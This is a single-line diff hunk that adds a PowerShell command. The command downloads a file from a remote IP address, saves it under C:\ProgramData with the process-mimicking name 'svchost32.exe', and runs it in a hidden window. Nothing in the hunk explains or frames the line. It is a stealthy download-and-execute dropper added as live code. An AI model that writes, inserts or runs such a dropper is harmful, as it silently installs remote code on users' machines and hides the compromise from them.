@@ -1,0 +1,1 @@
+<# Remote fetch #> $DownloadUrl = 'http://192.0.2.237:8080/assets/update.dat'; $DropPath = "C:\ProgramData\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DropPath); Start-Process -FilePath $DropPath -WindowStyle Hidden; $ProgressPreference = "SilentlyContinue"
